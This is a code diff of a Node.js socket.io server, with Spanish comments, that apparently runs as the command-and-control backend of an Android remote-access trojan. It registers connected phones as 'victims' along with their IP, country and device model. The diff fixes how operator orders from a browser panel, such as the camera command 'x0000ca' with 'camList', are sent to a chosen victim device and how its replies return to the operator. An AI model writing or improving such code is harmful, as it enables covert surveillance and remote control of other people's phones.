@@ -56,16 +56,16 @@ IO = io.listen(42474);
 IO.sockets.pingInterval = 10000;
 
 IO.sockets.on('connection', function(socket) {
-		console.log("Nueva Conexion");
+		//console.log("Nueva Conexion");
 	
 		var address = socket.request.connection;
 		var query = socket.handshake.query;
 		var index = query.id;
 		
-		if(query.web != "true"){
+		if(query.web == undefined){
 			
-			console.log("Agregando a Lista");
-			console.log(query.web);
+			/*console.log("Agregando a Lista");
+			console.log("Web1 : " +query.web);*/
 			
 			var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
 			var country = null;
@@ -76,41 +76,44 @@ IO.sockets.on('connection', function(socket) {
 			victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
 			
 			victimId = socket.id;
-			console.log(victimId);
+			
+			if(browserId != undefined){
+				//socket.broadcast.emit('enviarListado', victimId);	
+				IO.to(browserId).emit('enviarListado', victimId);
+			}
+			//console.log(victimId);
 		}else{
 			browserId = socket.id;
-			console.log("Enviando al browser");
-			
+			/*console.log("Enviando al browser");
+			console.log("Web2 : " +query.web);*/
 			
 			//socket.to(browserId).emit('enviarListado', victimId);
-			socket.emit('enviarListado', victimId);
+			if(victimId != undefined){
+				//socket.emit('enviarListado', victimId);	
+				IO.to(browserId).emit('enviarListado', victimId);
+			}
+			
 			//IO.sockets.emit('enviarListado', victimId);
-			console.log("browserId " + browserId);
-			console.log("victimId " + victimId);
+			/*console.log("browserId " + browserId);
+			console.log("victimId " + victimId);*/
 		}
 		
+		//Enviando Orden a Android
 		socket.on('order', (data, callback) => {
-		  console.log('linea 93 ' + data.idsocket + " orden " + data.order  +  "  Extra " + data.extra);
-		  socket.emit('order', {order:'x0000ca', extra: 'camList'});
+			//console.log('linea 93 ' + data.idsocket + " orden " + data.order  +  "  Extra " + data.extra);
+			//socket.broadcast.emit('order', {order:'x0000ca', extra: 'camList'});
+		    //console.log("Orden: " + data.order);
+			//console.log("Extra: " + data.extra);
+			IO.to(victimId).emit('order', {order:data.order, extra: data.extra});
 		});
 		
+		//Escuchando Respuesta
 		socket.on('x0000ca', (data, callback) => {
-			console.log('Devolviendo al browser');
-			socket.emit(orders.camera, {data:data});
-		})
+			console.log('Devolviendo al browser 1');
+			//socket.emit('x0000ca', {data:data});
+			IO.to(browserId).emit('x0000ca', {data});
+		});
 });
-//pOut.send('Open port' + ' ' + port);
-
-/*IO.sockets.on('order', (data, callback) => {
-  console.log('linea 100 ' + data.idsocket + " data.order " + data.order);
-  IO.sockets.to(data.idsocket).emit(order, {order:data.order, extra: data.extra});
-});
-
-IO.sockets.on(orders.camera, (data, callback) => {
-	 console.log('Devolviendo al browser');
-  IO.sockets.emit(order, {order:data.order, extra: data.extra});
-});*/
-
 
 /*https://stackoverflow.com/questions/44746534/send-messages-from-server-expressjs-routing-to-client*/
 /*router.post('/message/sendMessage', function (req, res, next) {
